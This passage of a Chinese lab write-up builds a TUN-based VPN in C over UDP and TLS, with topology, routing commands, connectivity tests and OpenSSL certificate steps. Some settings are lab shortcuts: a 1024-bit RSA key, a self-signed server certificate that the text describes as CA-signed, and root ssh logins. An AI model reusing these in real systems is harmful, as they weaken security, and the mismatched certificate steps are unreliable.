    bzero(buff, <span class="hljs-number">100</span>);   <span class="hljs-comment">//清空缓冲区</span>
    <span class="hljs-keyword">int</span> peerAddrLen = <span class="hljs-keyword">sizeof</span>(struct sockaddr_in); <span class="hljs-comment">//初始化结构体</span>
    <span class="hljs-keyword">int</span> len = recvfrom(sockfd, buff, <span class="hljs-number">100</span>, <span class="hljs-number">0</span>,(struct sockaddr *) &amp;peerAddr, &amp;peerAddrLen);      <span class="hljs-comment">// 等待接收数据 </span>
    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Connected with the client: %s\n&quot;</span>, buff);
    <span class="hljs-keyword">return</span> sockfd;
&#125;

<span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">tunSelected</span><span class="hljs-params">(<span class="hljs-keyword">int</span> tunfd, <span class="hljs-keyword">int</span> sockfd)</span></span>&#123;
    <span class="hljs-keyword">int</span>  len;
    <span class="hljs-keyword">char</span> buff[BUFF_SIZE];  <span class="hljs-comment">//定义接收数的缓冲区</span>

    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Got a packet from TUN\n&quot;</span>);
    bzero(buff, BUFF_SIZE);  <span class="hljs-comment">// 清空缓冲区</span>
    len = read(tunfd, buff, BUFF_SIZE);   <span class="hljs-comment">// 读取来自tun0网卡的数据，保存在缓冲区中</span>
    sendto(sockfd, buff, len, <span class="hljs-number">0</span>, (struct sockaddr *) &amp;peerAddr, <span class="hljs-keyword">sizeof</span>(peerAddr));
    <span class="hljs-comment">// 通过socket发送数据</span>
&#125;

<span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">socketSelected</span> <span class="hljs-params">(<span class="hljs-keyword">int</span> tunfd, <span class="hljs-keyword">int</span> sockfd)</span></span>&#123;
    <span class="hljs-keyword">int</span>  len;
    <span class="hljs-keyword">char</span> buff[BUFF_SIZE];
    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Got a packet from the tunnel\n&quot;</span>);
    bzero(buff, BUFF_SIZE);
    len = recvfrom(sockfd, buff, BUFF_SIZE, <span class="hljs-number">0</span>, <span class="hljs-literal">NULL</span>, <span class="hljs-literal">NULL</span>); <span class="hljs-comment">// 接收数据至buff，保存数据的长度</span>
    write(tunfd, buff, len);                <span class="hljs-comment">// 通过write发送到tun0</span>
&#125;


<span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span> <span class="hljs-params">(<span class="hljs-keyword">int</span> argc, <span class="hljs-keyword">char</span> * argv[])</span> </span>&#123;
   <span class="hljs-keyword">int</span> tunfd, sockfd;

   tunfd  = createTunDevice(); <span class="hljs-comment">// 创建tun0网卡 </span>
   sockfd = connectToUDPServer(); <span class="hljs-comment">// 建立socket连接</span>
    
   <span class="hljs-comment">// 进入主循环</span>
   <span class="hljs-keyword">while</span> (<span class="hljs-number">1</span>) &#123;
     fd_set readFDSet;

     FD_ZERO(&amp;readFDSet);   <span class="hljs-comment">// 将set清零使集合中不含任何fd</span>
     FD_SET(sockfd, &amp;readFDSet); <span class="hljs-comment">// 将socketfd加入set集合</span>
     FD_SET(tunfd, &amp;readFDSet);  <span class="hljs-comment">// 将tunfd加入set集合</span>
     select(FD_SETSIZE, &amp;readFDSet, <span class="hljs-literal">NULL</span>, <span class="hljs-literal">NULL</span>, <span class="hljs-literal">NULL</span>);  <span class="hljs-comment">// 监听两个端口 阻塞进程，知道有一个端口收到数据</span>
                              <span class="hljs-comment">// 当收到数据程序继续执行 对数据进行转发</span>
     <span class="hljs-keyword">if</span> (FD_ISSET(tunfd,  &amp;readFDSet))                  <span class="hljs-comment">// 当tun的文件fd可以读写</span>
         tunSelected(tunfd, sockfd);
     <span class="hljs-keyword">if</span> (FD_ISSET(sockfd, &amp;readFDSet))                  <span class="hljs-comment">// 当socket的文件fd可以读写</span>
         socketSelected(tunfd, sockfd);
  &#125;
&#125;
</code></pre>



<p><code>VPN client</code></p>
<pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;fcntl.h&gt;</span></span>
<span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdio.h&gt;</span></span>
<span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;unistd.h&gt;</span></span>
<span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;string.h&gt;</span></span>
<span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;arpa/inet.h&gt;</span></span>
<span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;linux/if.h&gt;</span></span>
<span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;linux/if_tun.h&gt;</span></span>
<span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;sys/ioctl.h&gt;</span></span>

<span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> BUFF_SIZE 2000</span>
<span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> PORT_NUMBER 55555</span>
<span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> SERVER_IP <span class="hljs-meta-string">&quot;10.0.2.8&quot;</span> <span class="hljs-comment">// VPN 服务器ip</span></span>
<span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">sockaddr_in</span> <span class="hljs-title">peerAddr</span>;</span>

<span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">createTunDevice</span><span class="hljs-params">()</span> </span>&#123;   <span class="hljs-comment">// 创建 tun0 网卡 </span>
   <span class="hljs-keyword">int</span> tunfd;
   <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">ifreq</span> <span class="hljs-title">ifr</span>;</span>
   <span class="hljs-built_in">memset</span>(&amp;ifr, <span class="hljs-number">0</span>, <span class="hljs-keyword">sizeof</span>(ifr));
    
   ifr.ifr_flags = IFF_TUN | IFF_NO_PI;   <span class="hljs-comment">// tun设备不包含以太网头部</span>
   tunfd = open(<span class="hljs-string">&quot;/dev/net/tun&quot;</span>, O_RDWR);  <span class="hljs-comment">// 打开文件</span>
   ioctl(tunfd, TUNSETIFF, &amp;ifr);         <span class="hljs-comment">// 打开设备</span>
   <span class="hljs-keyword">return</span> tunfd;
    <span class="hljs-comment">// 该函数执行完后 执行命令ifconfig tunX 192.168.53.5/24 up 为tun网卡设置IP并开启</span>
&#125;


<span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">connectToUDPServer</span><span class="hljs-params">()</span></span>&#123;    <span class="hljs-comment">//创建socket连接 连接到vpn服务器</span>
    <span class="hljs-keyword">int</span> sockfd;
    <span class="hljs-keyword">char</span> *hello=<span class="hljs-string">&quot;Hello&quot;</span>;
  <span class="hljs-comment">//指定服务器的地址结构</span>
    <span class="hljs-built_in">memset</span>(&amp;peerAddr, <span class="hljs-number">0</span>, <span class="hljs-keyword">sizeof</span>(peerAddr));
    peerAddr.sin_family = AF_INET;      <span class="hljs-comment">// 服务器地址类型为IPV4   </span>
    peerAddr.sin_port = htons(PORT_NUMBER);
    peerAddr.sin_addr.s_addr = inet_addr(SERVER_IP);

    sockfd = socket(AF_INET, SOCK_DGRAM, <span class="hljs-number">0</span>);
  
    sendto(sockfd, hello, <span class="hljs-built_in">strlen</span>(hello), <span class="hljs-number">0</span>,    <span class="hljs-comment">// 连接服务器后发送一个消息 hello</span>
                (struct sockaddr *) &amp;peerAddr, <span class="hljs-keyword">sizeof</span>(peerAddr));
    <span class="hljs-keyword">return</span> sockfd;
&#125;



<span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">tunSelected</span><span class="hljs-params">(<span class="hljs-keyword">int</span> tunfd, <span class="hljs-keyword">int</span> sockfd)</span></span>&#123;
    <span class="hljs-keyword">int</span>  len;
    <span class="hljs-keyword">char</span> buff[BUFF_SIZE];  <span class="hljs-comment">//定义接收数的缓冲区</span>

    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Got a packet from TUN\n&quot;</span>);
    bzero(buff, BUFF_SIZE);  <span class="hljs-comment">// 清空缓冲区</span>
    len = read(tunfd, buff, BUFF_SIZE);   <span class="hljs-comment">// 读取来自tun0网卡的数据，保存在缓冲区中</span>
    sendto(sockfd, buff, len, <span class="hljs-number">0</span>, (struct sockaddr *) &amp;peerAddr, <span class="hljs-keyword">sizeof</span>(peerAddr));
    <span class="hljs-comment">// 通过socket发送数据</span>
&#125;

<span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">socketSelected</span> <span class="hljs-params">(<span class="hljs-keyword">int</span> tunfd, <span class="hljs-keyword">int</span> sockfd)</span></span>&#123;
    <span class="hljs-keyword">int</span>  len;
    <span class="hljs-keyword">char</span> buff[BUFF_SIZE];
    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Got a packet from the tunnel\n&quot;</span>);
    bzero(buff, BUFF_SIZE);
    len = recvfrom(sockfd, buff, BUFF_SIZE, <span class="hljs-number">0</span>, <span class="hljs-literal">NULL</span>, <span class="hljs-literal">NULL</span>); <span class="hljs-comment">// 接收数据至buff，保存数据的长度</span>
    write(tunfd, buff, len);                <span class="hljs-comment">// 通过write发送到tun0</span>
&#125;


<span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span> <span class="hljs-params">(<span class="hljs-keyword">int</span> argc, <span class="hljs-keyword">char</span> * argv[])</span> </span>&#123;
   <span class="hljs-keyword">int</span> tunfd, sockfd;

   tunfd  = createTunDevice(); <span class="hljs-comment">// 创建tun0网卡 </span>
   sockfd = connectToUDPServer(); <span class="hljs-comment">// 建立socket连接</span>
    
   <span class="hljs-comment">// 进入主循环</span>
   <span class="hljs-keyword">while</span> (<span class="hljs-number">1</span>) &#123;
     fd_set readFDSet;

     FD_ZERO(&amp;readFDSet);   <span class="hljs-comment">// 将set清零使集合中不含任何fd</span>
     FD_SET(sockfd, &amp;readFDSet); <span class="hljs-comment">// 将socketfd加入set集合</span>
     FD_SET(tunfd, &amp;readFDSet);  <span class="hljs-comment">// 将tunfd加入set集合</span>
     select(FD_SETSIZE, &amp;readFDSet, <span class="hljs-literal">NULL</span>, <span class="hljs-literal">NULL</span>, <span class="hljs-literal">NULL</span>);  <span class="hljs-comment">// 监听两个端口 阻塞进程，知道有一个端口收到数据</span>
                              <span class="hljs-comment">// 当收到数据程序继续执行 对数据进行转发</span>
     <span class="hljs-keyword">if</span> (FD_ISSET(tunfd,  &amp;readFDSet))                  <span class="hljs-comment">// 当tun的文件fd可以读写</span>
         tunSelected(tunfd, sockfd);
     <span class="hljs-keyword">if</span> (FD_ISSET(sockfd, &amp;readFDSet))                  <span class="hljs-comment">// 当socket的文件fd可以读写</span>
         socketSelected(tunfd, sockfd);
  &#125;
&#125;</code></pre>

<h2 id="实验环境"><a href="#实验环境" class="headerlink" title="实验环境"></a>实验环境</h2><ul>
<li>实验装置</li>
<li>拓扑图</li>
<li>主机物理网卡配置</li>
</ul>
<h3 id="实验装置"><a href="#实验装置" class="headerlink" title="实验装置"></a>实验装置</h3><blockquote>
<p>host u：ubuntu 18.04</p>
<p>VPNserver：ubuntu 18.04</p>
<p>host V：ubuntu 18.04</p>
</blockquote>
<h3 id="网络拓扑图"><a href="#网络拓扑图" class="headerlink" title="网络拓扑图"></a>网络拓扑图</h3><blockquote>
<p>本次实验需要三台主机，分别作为host U(VPN 用户)，VPN服务, host V(内网主机)。</p>
<p>host V处于192.168.60.0/24网段，属于内网。</p>
<p>host U处于10.0.2.0/24网段，属于外网，host V 和 host U在没有VPN的情况下无法通信。</p>
<p>VPN server有两张网卡，一张网卡的IP地址为192.168.60.1处于192.168.60.0/24网段，作为host V的网关，并可以与其通信；而另一张网卡地址为10.0.2.8属于外网网段，可以与host U通信，同时其作为host U的VPN服务器，实现与host V通信。</p>
</blockquote>
<p><img src="https://raw.githubusercontent.com/sunzhengyu99/image/master/img/image-20210707152524640.png" alt="image-20210707152524640"></p>
<h3 id="主机物理网卡配置"><a href="#主机物理网卡配置" class="headerlink" title="主机物理网卡配置"></a>主机物理网卡配置</h3><table>
<thead>
<tr>
<th align="center">主机</th>
<th align="center">角色</th>
<th align="center">IP地址</th>
</tr>
</thead>
<tbody><tr>
<td align="center">客户机</td>
<td align="center">VPN客户机/host U</td>
<td align="center">10.0.2.7/24</td>
</tr>
<tr>
<td align="center">服务器</td>
<td align="center">VPN服务器/网关</td>
<td align="center">10.0.2.8/24<br>192.168.60.1/24</td>
</tr>
<tr>
<td align="center">内网主机</td>
<td align="center">host V</td>
<td align="center">192.168.60.101/24</td>
</tr>
</tbody></table>
<p><strong>tun0 虚拟网卡配置</strong></p>
<table>
<thead>
<tr>
<th align="center">主机</th>
<th align="center">虚拟接口</th>
<th align="center">IP地址</th>
</tr>
</thead>
<tbody><tr>
<td align="center">服务器</td>
<td align="center">tun0</td>
<td align="center">192.168.53.1/24</td>
</tr>
<tr>
<td align="center">客户机</td>
<td align="center">tun0</td>
<td align="center">192.168.53.5/24</td>
</tr>
</tbody></table>
<h3 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h3><p>运行了三台ubuntu的虚拟机，关系如上面描述</p>
<p><img src="C:/Users/Sunzh/AppData/Roaming/Typora/typora-user-images/image-20210707224946836.png" alt="image-20210707224946836"></p>
<h4 id="服务器主机"><a href="#服务器主机" class="headerlink" title="服务器主机"></a>服务器主机</h4><p>服务器主机需要两块网卡，这里通过VM再添加一块网卡即可，配置如图</p>
<img src="https://raw.githubusercontent.com/sunzhengyu99/image/master/img/image-20210707225616855.png" alt="image-20210707225616855" style="zoom:67%;">

<p>运行<code>vpnserver</code>程序，运行后会出现一个<code>tun0</code>网卡</p>
<p><img src="https://raw.githubusercontent.com/sunzhengyu99/image/master/img/image-20210707225804438.png" alt="image-20210707225804438"></p>
<p>使用命令配置<code>tun0</code></p>
<pre><code class="hljs apache"><span class="hljs-attribute">ifconfig</span> tun<span class="hljs-number">0</span> <span class="hljs-number">192.168.53.1</span>/<span class="hljs-number">24</span> up</code></pre>

<p><img src="https://raw.githubusercontent.com/sunzhengyu99/image/master/img/image-20210707230038034.png" alt="image-20210707230038034"></p>
<p>由于 VPN Server 需要在私网和隧道之间转发数据包，因此它也需要充当网关，这是通过在 VPN Server 上启用 IP 转发来实现的。</p>
<pre><code class="hljs apache"><span class="hljs-attribute">sysctl</span> net.ipv<span class="hljs-number">4</span>.ip_forward=<span class="hljs-number">1</span></code></pre>

<h4 id="host-v"><a href="#host-v" class="headerlink" title="host v"></a>host v</h4><p>客户端运行<code>./vpnclient</code>，之后会出现一个<code>tun0</code>接口，然后对其配置</p>
<pre><code class="hljs apache"><span class="hljs-attribute">ifconfig</span> tun<span class="hljs-number">0</span> <span class="hljs-number">192.168.53.5</span>/<span class="hljs-number">24</span> up</code></pre>

<img src="https://raw.githubusercontent.com/sunzhengyu99/image/master/img/image-20210707232611251.png" alt="image-20210707232611251" style="zoom:67%;">

<h4 id="配置路由"><a href="#配置路由" class="headerlink" title="配置路由"></a>配置路由</h4><p>经过以上两步，隧道就建立起来了，然后我们设置路由路径以将预期流量引导到客户端和服务器机器上的隧道。在 host v上，我们将所有进入专用网络 (192.168.60.0/24) 的数据包定向到 tun0 接口，数据包将从该接口通过 VPN 隧道转发。我们使用 route 命令在 host v 上添加以下路由条目：</p>
<pre><code class="hljs apache"><span class="hljs-attribute">route</span> add -net <span class="hljs-number">192.168.60.0</span>/<span class="hljs-number">24</span> tun<span class="hljs-number">0</span></code></pre>

<p><img src="https://raw.githubusercontent.com/sunzhengyu99/image/master/img/image-20210707233335994.png" alt="image-20210707233335994"></p>
<p>在服务器主机上，将流向 192.168.53.0/24 网络的流量定向到 tun0 接口</p>
<p><img src="C:/Users/Sunzh/AppData/Roaming/Typora/typora-user-images/image-20210707233447176.png" alt="image-20210707233447176"></p>
<p>内网主机上为了通过 VPN 隧道将 Host V （内网主机）回复发送到 Host U，我们在 Host V 上添加了一个路由条目，它将去往 Host U 网络的数据包路由到 VPN Serve。从 VPN Server，这个数据包将通过 VPN 隧道到达 VPN Client，最终到达 Host U。 下面显示了 Host V 上的路由条目</p>
<pre><code class="hljs apache"><span class="hljs-attribute">route</span> add -net <span class="hljs-number">192.168.53.0</span>/<span class="hljs-number">24</span> gw <span class="hljs-number">192.168.60.1</span> ens<span class="hljs-number">33</span></code></pre>

<p><img src="C:/Users/Sunzh/AppData/Roaming/Typora/typora-user-images/image-20210707234034756.png" alt="image-20210707234034756"></p>
<h2 id="验证通信"><a href="#验证通信" class="headerlink" title="验证通信"></a>验证通信</h2><h3 id="ping-测试"><a href="#ping-测试" class="headerlink" title="ping 测试"></a>ping 测试</h3><p>cliet ping 内网主机</p>
<p><img src="https://raw.githubusercontent.com/sunzhengyu99/image/master/img/image-20210707232714091.png" alt="image-20210707232714091"></p>
<p>内网主机ping client</p>
<p><img src="https://raw.githubusercontent.com/sunzhengyu99/image/master/img/image-20210707233045553.png" alt="image-20210707233045553"></p>
<p>内网主机追踪路由，可以看到经过网关<code>192.168.60.1</code>到达了目的地址</p>
<p><img src="https://raw.githubusercontent.com/sunzhengyu99/image/master/img/image-20210707174129705.png" alt="image-20210707174129705"></p>
<p>查看vpnclient和vpnserver程序的运行情况</p>
<p><strong>VPN client</strong></p>
<blockquote>
<p>在发送 ping 请求时，vpnclient反映已收到 TUN 接口上的数据包（ping 请求）并连续收到隧道中的包（ping 回复）</p>
</blockquote>
<p><img src="https://raw.githubusercontent.com/sunzhengyu99/image/master/img/image-20210707234515470.png" alt="image-20210707234515470" style="zoom: 67%;"><img src="https://raw.githubusercontent.com/sunzhengyu99/image/master/img/image-20210708000049518.png" alt="image-20210708000049518"></p>
<p><strong>VPN server</strong></p>
<blockquote>
<p>在 vpnserver上，程序反映从隧道接收数据包（ping 请求），然后从 TUN 接收数据包（ping 回复）</p>
</blockquote>
<img src="https://raw.githubusercontent.com/sunzhengyu99/image/master/img/image-20210707234610430.png" alt="image-20210707234610430" style="zoom:67%;">

<h3 id="ssh测试"><a href="#ssh测试" class="headerlink" title="ssh测试"></a>ssh测试</h3><p>在host V执行</p>
<pre><code class="hljs sh">ssh root@192.168.60.101</code></pre>

<img src="https://raw.githubusercontent.com/sunzhengyu99/image/master/img/image-20210708000433140.png" alt="image-20210708000433140" style="zoom:80%;">

<p>在 host U上执行</p>
<pre><code class="hljs sh">ssh root@10.0.2.7</code></pre>

<img src="https://raw.githubusercontent.com/sunzhengyu99/image/master/img/image-20210708000944524.png" alt="image-20210708000944524" style="zoom:80%;">

<p>通过上面的测试可以确定两台主机可以通过VPN程序进行远程控制。</p>
<h1 id="二、TSL-VPN"><a href="#二、TSL-VPN" class="headerlink" title="二、TSL VPN"></a>二、TSL VPN</h1><p>有了上面基于TCP的VPN，再做TSL就会简单很多。</p>
<h2 id="程序实现-1"><a href="#程序实现-1" class="headerlink" title="程序实现"></a>程序实现</h2><h3 id="ssl初始化"><a href="#ssl初始化" class="headerlink" title="ssl初始化"></a>ssl初始化</h3><p>创建SSL数据结构，用于建立TLS连接</p>
<p><code>VPN server</code></p>
<pre><code class="hljs c"><span class="hljs-function">SSL* <span class="hljs-title">SSLLibInit</span><span class="hljs-params">()</span> </span>&#123;
   SSL_METHOD *meth;
   SSL_CTX* ctx;
   SSL *ssl;
   <span class="hljs-keyword">int</span> err;

   <span class="hljs-comment">// OpenSSL 初始化</span>
   SSL_library_init();
   SSL_load_error_strings();
   SSLeay_add_ssl_algorithms();
   
   <span class="hljs-comment">// SSL 初始化</span>
   meth = (SSL_METHOD *)TLSv1_2_method();
   ctx = SSL_CTX_new(meth);
   SSL_CTX_set_verify(ctx, SSL_VERIFY_NONE, <span class="hljs-literal">NULL</span>);
   <span class="hljs-comment">// 加载服务器证书和私钥文件</span>
   SSL_CTX_use_certificate_file(ctx, <span class="hljs-string">&quot;./cert_server/server.pem&quot;</span>, SSL_FILETYPE_PEM);
   SSL_CTX_use_PrivateKey_file(ctx, <span class="hljs-string">&quot;./cert_server/server-key.pem&quot;</span>, SSL_FILETYPE_PEM);
   ssl = SSL_new (ctx);
   <span class="hljs-keyword">return</span> ssl;
&#125;</code></pre>

<p><code>VPN client</code></p>
<pre><code class="hljs c"><span class="hljs-function">SSL* <span class="hljs-title">setupTLSClient</span><span class="hljs-params">(<span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span>* hostname)</span></span>
<span class="hljs-function"></span>&#123;
    <span class="hljs-comment">// OpenSSL 初始化</span>
   SSL_library_init();
   SSL_load_error_strings();
   SSLeay_add_ssl_algorithms();
   SSL_METHOD *meth;
   SSL_CTX* ctx;
   SSL* ssl;

   meth = (SSL_METHOD *)TLSv1_2_method();
   ctx = SSL_CTX_new(meth);

   SSL_CTX_set_verify(ctx, SSL_VERIFY_PEER, verify_callback);  <span class="hljs-comment">//指明是否要求提供证书</span>
   <span class="hljs-keyword">if</span> (SSL_CTX_load_verify_locations(ctx,<span class="hljs-literal">NULL</span>, CA_DIR) &lt; <span class="hljs-number">1</span>) &#123; <span class="hljs-comment">//加载可信CA证书，进行证书验证</span>
        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Error setting the verify locations. \n&quot;</span>);
        <span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>);
   &#125;
   ssl = SSL_new (ctx);

   X509_VERIFY_PARAM *vpm = SSL_get0_param(ssl); 
   X509_VERIFY_PARAM_set1_host(vpm, hostname, <span class="hljs-number">0</span>);

   <span class="hljs-keyword">return</span> ssl;
&#125;</code></pre>

<h3 id="TCP连接-1"><a href="#TCP连接-1" class="headerlink" title="TCP连接"></a>TCP连接</h3><p>TCP连接与上面的连接一样。</p>
<h3 id="TLS握手"><a href="#TLS握手" class="headerlink" title="TLS握手"></a>TLS握手</h3><blockquote>
<p>SSL_set_fd()将SSL绑定到一个TCP连接<br>调用SSL_connec()启动与服务器的TLS握手协议)</p>
</blockquote>
<pre><code class="hljs c"><span class="hljs-comment">/*----------------TLS initialization ----------------*/</span>
ssl   = setupTLSClient(hostname);
<span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;TLSClientsetup initialisation is successful\n&quot;</span>);

<span class="hljs-comment">/*----------------Create a TCP connection ---------------*/</span>
<span class="hljs-keyword">int</span> sockfd = setupTCPClient(hostname, port);
<span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;TCPClientsetup is successful\n&quot;</span>);

<span class="hljs-comment">/*----------------TLS handshake ---------------------*/</span>
SSL_set_fd(ssl, sockfd);  <span class="hljs-comment">//绑定TCP连接</span>
<span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;SSL_set_fd() is successful\n&quot;</span>);
<span class="hljs-keyword">int</span> err = SSL_connect(ssl); CHK_SSL(err);
<span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;SSL connection is successful\n&quot;</span>);
<span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;SSL connection using %s\n&quot;</span>, SSL_get_cipher(ssl));</code></pre>

<h3 id="数据转发"><a href="#数据转发" class="headerlink" title="数据转发"></a>数据转发</h3><p>数据转发的原理与基于UDP/TCP的VPN 的原理</p>
<pre><code class="hljs C"><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">processRequest</span><span class="hljs-params">(<span class="hljs-keyword">int</span> tunfd, SSL* ssl, <span class="hljs-keyword">int</span> sockfd)</span></span>
<span class="hljs-function"></span>&#123;
   <span class="hljs-keyword">while</span>(<span class="hljs-number">1</span>) &#123;
     fd_set readFDSet;

     FD_ZERO(&amp;readFDSet);
     FD_SET(sockfd, &amp;readFDSet);
     FD_SET(tunfd, &amp;readFDSet);
     select(FD_SETSIZE, &amp;readFDSet, <span class="hljs-literal">NULL</span>, <span class="hljs-literal">NULL</span>, <span class="hljs-literal">NULL</span>);

     <span class="hljs-keyword">if</span> (FD_ISSET(tunfd,  &amp;readFDSet)) tunSelected(tunfd, sockfd, ssl);
     <span class="hljs-keyword">if</span> (FD_ISSET(sockfd, &amp;readFDSet)) socketSelected(tunfd, sockfd, ssl);
   &#125;
&#125;</code></pre>



<h2 id="实验环境-1"><a href="#实验环境-1" class="headerlink" title="实验环境"></a>实验环境</h2><p>由于在上ubuntu 18.04上运行时，程序出现错误，所以使用了seedLab 提供的 ubuntu 16.04重新搭建了实验环境。各个网卡信息与上面的实验一样。</p>
<blockquote>
<p>host U：ubuntu 16.04</p>
<p>VPNserver：ubuntu 16.04</p>
<p>host V：ubuntu 16.04</p>
</blockquote>
<h3 id="主机物理网卡配置-1"><a href="#主机物理网卡配置-1" class="headerlink" title="主机物理网卡配置"></a>主机物理网卡配置</h3><table>
<thead>
<tr>
<th align="center">主机</th>
<th align="center">角色</th>
<th align="center">IP地址</th>
</tr>
</thead>
<tbody><tr>
<td align="center">客户机</td>
<td align="center">VPN客户机/host U</td>
<td align="center">10.0.2.7/24</td>
</tr>
<tr>
<td align="center">服务器</td>
<td align="center">VPN服务器/网关</td>
<td align="center">10.0.2.8/24<br>192.168.60.1/24</td>
</tr>
<tr>
<td align="center">内网主机</td>
<td align="center">host V</td>
<td align="center">192.168.60.101/24</td>
</tr>
</tbody></table>
<h3 id="连通性测试"><a href="#连通性测试" class="headerlink" title="连通性测试"></a>连通性测试</h3><p>配置完各个网卡的IP地址后</p>
<ul>
<li><p>host U 可以 ping 通 VPNserver (10.0.2.0/24)</p>
<img src="C:/Users/Sunzh/AppData/Roaming/Typora/typora-user-images/image-20210717190020679.png" alt="image-20210717190020679" style="zoom:67%;">

<img src="C:/Users/Sunzh/AppData/Roaming/Typora/typora-user-images/image-20210716203822712.png" alt="image-20210716203822712" style="zoom: 50%;">
</li>
<li><p>VPN server 可以ping 通两台主机</p>
<p><img src="C:/Users/Sunzh/AppData/Roaming/Typora/typora-user-images/image-20210717185939151.png" alt="image-20210717185939151" style="zoom: 67%;"><img src="C:/Users/Sunzh/AppData/Roaming/Typora/typora-user-images/image-20210717185952701.png" alt="image-20210717185952701" style="zoom:67%;"></p>
<img src="C:/Users/Sunzh/AppData/Roaming/Typora/typora-user-images/image-20210716203744476.png" alt="image-20210716203744476" style="zoom: 50%;">
</li>
<li><p>host V可以ping 通VPNserver (192.168.60.0/24)</p>
<img src="C:/Users/Sunzh/AppData/Roaming/Typora/typora-user-images/image-20210717190103613.png" alt="image-20210717190103613" style="zoom:67%;">

<img src="C:/Users/Sunzh/AppData/Roaming/Typora/typora-user-images/image-20210716203807499.png" alt="image-20210716203807499" style="zoom: 50%;">



</li>
</ul>
<h3 id="CA和证书设置"><a href="#CA和证书设置" class="headerlink" title="CA和证书设置"></a>CA和证书设置</h3><p>(1)、为 CA 生成一个自签名证书，它将作为根证书，如下所示：</p>
<pre><code class="hljs vim">openssl req -<span class="hljs-keyword">new</span> -x509 -keyout <span class="hljs-keyword">ca</span>.key -out <span class="hljs-keyword">ca</span>.crt -config openssl.<span class="hljs-keyword">cnf</span>
//文件 <span class="hljs-keyword">ca</span>.key 包含 CA 的私钥，而 <span class="hljs-keyword">ca</span>.crt 包含公钥证书。</code></pre>

<img src="https://raw.githubusercontent.com/sunzhengyu99/image/master/img/image-20210717192409460.png" alt="image-20210717192409460" style="zoom:80%;">



<p>(2)、接下来，我们使用以下命令为服务器创建一个 RSA 公私钥对</p>
<pre><code class="hljs apache"><span class="hljs-attribute">openssl</span> genrsa -aes<span class="hljs-number">128</span> -out server.key <span class="hljs-number">1024</span></code></pre>

<p><img src="https://raw.githubusercontent.com/sunzhengyu99/image/master/img/image-20210717192456568.png" alt="image-20210717192456568"></p>
<p>(3)、创建一个包含服务器公钥的证书签名请求 (CSR)。 CSR 具有以下详细信息，服务器的通用名称为 <code>sunzy.com</code>：</p>
<pre><code class="hljs pgsql">openssl req -<span class="hljs-built_in">new</span> -key <span class="hljs-keyword">server</span>.key -<span class="hljs-keyword">out</span> <span class="hljs-keyword">server</span>.csr -config openssl.cnf</code></pre>

<img src="https://raw.githubusercontent.com/sunzhengyu99/image/master/img/image-20210717192547722.png" alt="image-20210717192547722" style="zoom:80%;">



<p>(4)、然后将上述 CSR 发送到 CA 以生成密钥和通用名称的证书。</p>
<pre><code class="hljs pgsql">openssl x509 -req -days <span class="hljs-number">365</span> -<span class="hljs-keyword">in</span> <span class="hljs-keyword">server</span>.csr -signkey <span class="hljs-keyword">server</span>.key -<span class="hljs-keyword">out</span> <span class="hljs-keyword">server</span>.crt</code></pre>

<img src="https://raw.githubusercontent.com/sunzhengyu99/image/master/img/image-20210716211833071.png" alt="image-20210716211833071" style="zoom: 67%;">



<p>(5)、将服务器的证书和密钥存储为 pem 文件，这里是</p>
<pre><code class="hljs axapta">cp <span class="hljs-keyword">server</span>.crt <span class="hljs-keyword">server</span>-cert.pem
cp <span class="hljs-keyword">server</span>.key <span class="hljs-keyword">server</span>-key.pem</code></pre>

<p>VPN Server 程序使用这些文件来加载证书和私钥，如下所示</p>
<p><img src="https://raw.githubusercontent.com/sunzhengyu99/image/master/img/image-20210717105652371.png" alt="image-20210717105652371"></p>
<p>(6)、使用名称作为主题字段的哈希存储服务器的证书。这是因为在接收服务器的证书时，TLS 会根据颁发者的身份信息生成一个哈希值，并使用此哈希值在“./cert”文件夹中查找颁发者的证书，命令如下:(以下命令在ca_client 文件下执行)</p>
<pre><code class="hljs apache"><span class="hljs-attribute">openssl</span> x<span class="hljs-number">509</span> -in ca.crt -noout -subject_hash
<span class="hljs-attribute">ln</span> -s ca.crt b<span class="hljs-number">4386</span>d<span class="hljs-number">70</span>.<span class="hljs-number">0</span></code></pre>

